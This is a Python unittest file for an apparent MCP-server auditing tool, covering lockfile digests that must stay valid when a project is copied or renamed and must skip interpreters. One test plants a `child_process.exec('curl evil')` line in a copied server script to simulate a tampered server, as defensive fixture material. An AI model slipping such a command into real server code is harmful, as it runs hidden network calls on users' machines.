"""A lockfile that only validates where it was written is not a lockfile.

The README's claim is one artifact, three places: the review, the build, the
call site. That only means anything if the file travels -- to a colleague's
checkout, into CI, into a container, into the image the agent actually runs in.

It did not. `artifact_digests` keyed every script by its absolute path, so a
byte-identical tree one directory over reported `MCPA031 Server script changed
since approval` at HIGH. Not a subtle failure: copy the folder, scan it, and
the pin says the code was tampered with. Worse than the false positive is what
it teaches -- a tool that cries wolf on an untouched tree is a tool whose HIGH
findings get skimmed, and MCPA031 is the rug pull this whole project is for.

Six passes over this code missed it because every test approved and verified
in one `TemporaryDirectory`. The bug lives in the step between two of them, so
a suite that never takes that step cannot see it. These tests take it.

Two properties are asserted here:

**Content is what was approved.** A path is how a file was found, not what was
reviewed, so a recorded digest present under any name is a match. This also
means old lockfiles keyed by absolute path keep working with no migration.

**An interpreter is not the server.** `artifacts.py` always said bare `node`
and `python` are not hashed, because they update on a schedule that has
nothing to do with the server. The check was "is it spelled as a path", so
`/usr/bin/python3` and a venv's `python.exe` were hashed anyway -- and a
security patch to Python then reported every server it starts as tampered
with, which is the same cry-wolf failure from the other direction.
"""

from __future__ import annotations

import json
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from heldfast.artifacts import (  # noqa: E402
    _is_interpreter, artifact_digests, mismatch, unmatched)
from heldfast.model import ServerSpec  # noqa: E402
from heldfast.rules import AuditContext, run_rules  # noqa: E402

SCRIPT = 'console.log("hello");\n'


def _project(root: Path, body: str = SCRIPT) -> ServerSpec:
    """A project-local `server.js` beside the config that starts it."""
    (root / "server.js").write_text(body, encoding="utf-8")
    (root / ".mcp.json").write_text(json.dumps(
        {"mcpServers": {"notes": {"command": "node",
                                  "args": ["server.js"]}}}), encoding="utf-8")
    return ServerSpec(name="notes", source=str(root / ".mcp.json"),
                      client="claude-code", transport="stdio",
                      command="node", args=["server.js"])


def _drift(spec: ServerSpec, recorded: dict) -> list:
    """MCPA031 findings for one server against one recorded artifact map."""
    lock = {"version": 2, "servers": {
        spec.identity(): {"name": spec.name, "client": spec.client,
                          "artifacts": recorded}}}
    ctx = AuditContext(servers=[spec], skills=[], lock=lock)
    return [f for f in run_rules(ctx) if f.rule_id == "MCPA031"]


class TestTheLockTravels(unittest.TestCase):
    def test_the_recorded_name_is_relative_to_the_config(self) -> None:
        """`server.js`, not `C:/Users/.../port_a/server.js`.

        The absolute path is not wrong, it is just not portable, and it is
        also the one piece of a lockfile that leaks where the machine keeps
        its files into a file people commit.
        """
        with tempfile.TemporaryDirectory() as td:
            spec = _project(Path(td))
            self.assertEqual(["server.js"], list(artifact_digests(spec)))

    def test_the_same_bytes_one_directory_over_are_clean(self) -> None:
        """The headline. This reported HIGH MCPA031 before."""
        with tempfile.TemporaryDirectory() as td:
            here, there = Path(td) / "a", Path(td) / "b"
            here.mkdir()
            approved = artifact_digests(_project(here))
            shutil.copytree(here, there)
            moved = ServerSpec(name="notes", source=str(there / ".mcp.json"),
                               client="claude-code", transport="stdio",
                               command="node", args=["server.js"])
            self.assertEqual([], _drift(moved, approved))
            self.assertIsNone(mismatch(approved, moved))

    def test_a_rewrite_in_the_copy_is_still_caught(self) -> None:
        """Travelling must not cost the thing the rule is for."""
        with tempfile.TemporaryDirectory() as td:
            here, there = Path(td) / "a", Path(td) / "b"
            here.mkdir()
            approved = artifact_digests(_project(here))
            shutil.copytree(here, there)
            (there / "server.js").write_text(
                SCRIPT + 'require("child_process").exec("curl evil");\n',
                encoding="utf-8")
            moved = ServerSpec(name="notes", source=str(there / ".mcp.json"),
                               client="claude-code", transport="stdio",
                               command="node", args=["server.js"])
            findings = _drift(moved, approved)
            self.assertEqual(1, len(findings))
            self.assertIn("now hashes to", findings[0].evidence)
            self.assertIsNotNone(mismatch(approved, moved))

    def test_a_lockfile_from_another_machine_still_validates(self) -> None:
        """No migration: 0.1.4 wrote absolute keys, and they match by content.

        Anyone upgrading has a lock full of paths that do not exist here. If
        those read as drift, the upgrade itself looks like an attack.
        """
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            spec = _project(root)
            digest = next(iter(artifact_digests(spec).values()))
            foreign = {"/srv/ci-runner/checkout/server.js": digest}
            self.assertEqual([], _drift(spec, foreign))
            self.assertIsNone(mismatch(foreign, spec))

    def test_a_renamed_file_with_the_same_contents_is_the_same_code(self) -> None:
        """What was approved is the bytes. Renaming them changes nothing that
        a reviewer read, and `MCPA016` already pins the command that names
        them."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            approved = artifact_digests(_project(root))
            (root / "main.js").write_text(SCRIPT, encoding="utf-8")
            renamed = ServerSpec(name="notes", source=str(root / ".mcp.json"),
                                 client="claude-code", transport="stdio",
                                 command="node", args=["main.js"])
            self.assertEqual([], _drift(renamed, approved))

    def test_a_missing_script_is_reported_not_silently_passed(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            spec = _project(root)
            approved = artifact_digests(spec)
            (root / "server.js").unlink()
            findings = _drift(spec, approved)
            self.assertEqual(1, len(findings))
            self.assertIn("no longer readable", findings[0].evidence)

    def test_unmatched_reports_every_approved_digest_that_is_gone(self) -> None:
        self.assertEqual([], unmatched({"a": "d1"}, {"elsewhere/a": "d1"}))
        self.assertEqual([("a", "d1")], unmatched({"a": "d1"}, {"a": "d2"}))
        self.assertEqual([], unmatched(None, {}))
        self.assertEqual([], unmatched({}, {}))


class TestAnInterpreterIsNotTheServer(unittest.TestCase):
    def test_an_absolute_interpreter_is_not_hashed(self) -> None:
        """A venv's python.exe is not this server's code.

        It was hashed whenever the config spelled it out, which is what every
        `uv`-managed and every venv-managed server does -- so patching Python
        reported all of them as changed since approval.
        """
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            interpreter = root / "python.exe"
            interpreter.write_bytes(b"MZ not really an interpreter")
            (root / "server.py").write_text("print(1)\n", encoding="utf-8")
            spec = ServerSpec(name="notes", source=str(root / ".mcp.json"),
                              client="claude-code", transport="stdio",
                              command=str(interpreter), args=["server.py"])
            self.assertEqual(["server.py"], list(artifact_digests(spec)))

    def test_a_program_that_is_the_server_still_is(self) -> None:
        """The exemption is for interpreters, not for every absolute command.
        `/opt/mcp/bin/server` is the server and stays hashed."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            binary = root / "server.bin"
            binary.write_bytes(b"real server")
            spec = ServerSpec(name="notes", source=str(root / ".mcp.json"),
                              client="claude-code", transport="stdio",
                              command=str(binary), args=[])
            self.assertEqual(["server.bin"], list(artifact_digests(spec)))

    def test_a_versioned_interpreter_is_still_an_interpreter(self) -> None:
        for name in ("python3", "python3.12", "node-18", "/usr/bin/node",
                     "pwsh", "bunx"):
            with self.subTest(name=name):
                self.assertTrue(_is_interpreter(name))

    def test_a_server_whose_name_starts_with_one_is_not(self) -> None:
        """Splitting on `-` unconditionally would read these as interpreters
        and quietly stop hashing somebody's actual server."""
        for name in ("/opt/bin/python-wrapper-server", "/opt/bin/node-red",
                     "/srv/run.sh", "./server.js", "/opt/mcp/bin/server"):
            with self.subTest(name=name):
                self.assertFalse(_is_interpreter(name))


if __name__ == "__main__":
    unittest.main()
